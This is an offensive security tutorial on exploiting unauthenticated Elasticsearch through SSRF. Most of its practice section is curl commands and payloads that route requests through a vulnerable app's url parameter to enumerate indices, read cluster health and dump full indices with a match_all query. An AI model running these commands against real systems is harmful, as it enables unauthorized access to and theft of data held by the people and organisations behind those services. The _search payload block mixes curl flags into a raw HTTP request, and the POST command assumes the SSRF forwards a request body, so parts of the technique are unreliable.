---
title: Exploiting Elasticsearch via SSRF for Data Access
description: Learn how to exploit Elasticsearch's API through SSRF for data access
  and reconnaissance.
keywords:
- Elasticsearch
- SSRF
- server-side request forgery
- data extraction
- unauthenticated access
- REST API
- cluster health
- indices enumeration
---

# Elasticsearch

## Context

This guide focuses on exploiting unauthenticated Elasticsearch instances through Server-Side Request Forgery (SSRF) to perform reconnaissance and access data. Users should have a foundational understanding of HTTP protocol, REST API, JSON format, and SSRF techniques.

## Theory

### Elasticsearch HTTP Interface and SSRF Exposure

Elasticsearch offers a RESTful API over HTTP, typically accessible on port 9200. This interface can be exploited through SSRF if accessible from a vulnerable web server, allowing attackers to make HTTP requests to internal services. Unauthenticated Elasticsearch instances can permit unrestricted API access, making them vulnerable to unauthorized enumeration and data retrieval.

### Key Endpoints for Reconnaissance and Data Extraction

- **/_cat/indices**: This endpoint lists all indices present in the cluster, providing an overview of the data structure within Elasticsearch.
- **/_cluster/health**: This endpoint reveals information about the cluster's status and its nodes, including details such as the number of nodes and shard health.
- **/_search**: This endpoint allows querying within indices, facilitating data extraction from these indices as per specific queries.

### Security Misconfigurations and Threat Surface

Elasticsearch installations, particularly default ones, may lack proper authentication, exposing sensitive data to SSRF attackers. Many organizations assume internal services are shielded from external attacks; however, SSRF exploits can sever this assumed protection, making internal data vulnerable.

## Practice

### Enumerate Elasticsearch Indices via SSRF

By crafting an SSRF payload, attackers can query the /_cat/indices endpoint to gather information about all indices in the cluster.

- **Payload**:
    ```http
    GET http://localhost:9200/_cat/indices?v
    ```
    This payload is designed to be sent to the Elasticsearch HTTP interface locally via a SSRF vulnerability in another application.

- **Command**:
    ```bash
    curl -s -X GET 'http://<vulnerable-app>/ssrf?url=http://localhost:9200/_cat/indices?v'
    ```
    Execute this command to exploit the SSRF vulnerability and retrieve a list of indices from Elasticsearch.

**Outcome**: The list of indices present in the Elasticsearch instance, offering potential targets for further data extraction.

### Obtain Cluster Health Information via SSRF

Attackers can target the /_cluster/health endpoint to obtain critical information about the cluster's health and node configuration.

- **Payload**:
    ```http
    GET http://localhost:9200/_cluster/health
    ```
    This payload retrieves status-related information about the Elasticsearch cluster.

- **Command**:
    ```bash
    curl -s -X GET 'http://<vulnerable-app>/ssrf?url=http://localhost:9200/_cluster/health'
    ```
    This command sends the SSRF request to check the health of the Elasticsearch cluster.

**Outcome**: Information such as node count, cluster health, and status is obtained, aiding in further strategic exploitation.

### Extract Data from an Index via SSRF

Using the /_search endpoint, attackers can query and extract data from specific indices in Elasticsearch via SSRF.

- **Payload**:
    ```http
    POST http://localhost:9200/<index>/_search -d '{"query":{"match_all":{}}}' -H 'Content-Type: application/json'
    ```
    Replace `<index>` with the specific index name to query all documents.

- **Command**:
    ```bash
    curl -s -X POST 'http://<vulnerable-app>/ssrf?url=http://localhost:9200/<index>/_search' -H 'Content-Type: application/json' -d '{"query":{"match_all":{}}}'
    ```
    Utilize this command to execute an SSRF attack aiming to extract data from the chosen index.

**Outcome**: The attacker successfully retrieves documents from the specified Elasticsearch index, gaining potential access to sensitive information.

## Tools

- **curl**